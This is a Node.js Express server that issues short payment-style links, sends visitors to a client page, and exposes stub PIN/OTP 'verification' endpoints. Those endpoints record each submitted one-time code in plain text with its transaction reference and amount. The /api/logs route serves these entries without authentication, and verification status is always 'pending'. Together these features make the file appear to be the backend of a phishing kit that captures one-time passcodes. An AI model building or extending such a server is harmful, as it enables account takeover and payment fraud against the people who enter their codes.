const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ────────────────────────────────────────────────────────────
   In-memory stores (replace with DB / Redis for production)
   ──────────────────────────────────────────────────────────── */
const links = new Map(); // code -> payload
const logs = [];         // { time, text, level }

function log(text, level) {
  const entry = {
    time: new Date().toISOString().slice(11, 19),
    text: String(text),
    level: level || 'info'
  };
  logs.push(entry);
  if (logs.length > 500) logs.shift();
}

/* ────────────────────────────────────────────────────────────
   Link routes
   ──────────────────────────────────────────────────────────── */

// Create short link
app.post('/api/links', (req, res) => {
  const payload = req.body || {};
  if (!payload || typeof payload !== 'object' || Object.keys(payload).length === 0) {
    return res.status(400).json({ error: 'Missing payload' });
  }
  let code;
  // Avoid collisions
  do {
    code = Math.random().toString(36).substring(2, 10).toUpperCase();
  } while (links.has(code));

  links.set(code, payload);
  log('Created link ' + code + ' (' + (payload.tx || payload.tn || 'no-ref') + ')', 'ok');
  res.json({ code });
});

// Fetch link by code (used by client.html?r=CODE)
app.get('/api/links/:code', (req, res) => {
  const code = String(req.params.code || '').toUpperCase();
  const payload = links.get(code);
  if (!payload) {
    log('Link not found: ' + code, 'err');
    return res.status(404).json({ error: 'Not found' });
  }
  log('Resolved link ' + code, 'ok');
  res.json({ payload });
});

// Optional shorten endpoint (admin.html calls it)
app.post('/api/shorten', (req, res) => {
  const url = req.body && req.body.url;
  if (!url) return res.status(400).json({ error: 'Missing url' });
  res.json({ shortUrl: url });
});

/* ────────────────────────────────────────────────────────────
   Verification routes (PIN + OTP flows)
   ──────────────────────────────────────────────────────────── */

app.post('/api/verify/send', (req, res) => {
  const body = req.body || {};
  const requestId = 'req-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6);
  log('Verify send ' + requestId + ' | ref=' + (body.reference || '-') + ' | method=' + (body.method || '-'), 'info');
  res.json({ requestId });
});

app.get('/api/verify/status/:id', (req, res) => {
  res.json({ status: 'pending' });
});

app.post('/api/verification/otp', (req, res) => {
  const body = req.body || {};
  log('OTP request | tx=' + (body.tx || '-') + ' | am=' + (body.am || '-') + ' ' + (body.cur || ''), 'info');
  res.json({ ok: true });
});

app.post('/api/verification/submit', (req, res) => {
  const body = req.body || {};
  log('OTP submit | tx=' + (body.tx || '-') + ' | otp=' + (body.otp || '-'), 'info');
  res.json({ ok: true });
});

app.get('/api/verification/status/:ref', (req, res) => {
  res.json({ decision: 'pending' });
});

/* ────────────────────────────────────────────────────────────
   Logs
   ──────────────────────────────────────────────────────────── */
app.get('/api/logs', (req, res) => {
  res.json({ entries: logs });
});

/* ────────────────────────────────────────────────────────────
   Root-level short link redirect
   /ABC12345 -> /client.html?r=ABC12345
   Must come BEFORE app.get('/')
   ──────────────────────────────────────────────────────────── */
app.get('/:code([A-Z0-9]{6,12})', (req, res) => {
  const code = req.params.code.toUpperCase();
  if (links.has(code)) {
    log('Short link ' + code + ' -> client.html', 'ok');
    return res.redirect(302, '/client.html?r=' + encodeURIComponent(code));
  }
  log('Unknown short link: ' + code, 'err');
  return res.redirect(302, '/');
});

/* ────────────────────────────────────────────────────────────
   Fallback — only for "/" not for every path
   ──────────────────────────────────────────────────────────── */
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Unknown paths → 404
app.use((req, res) => {
  res.status(404).send('Not found');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
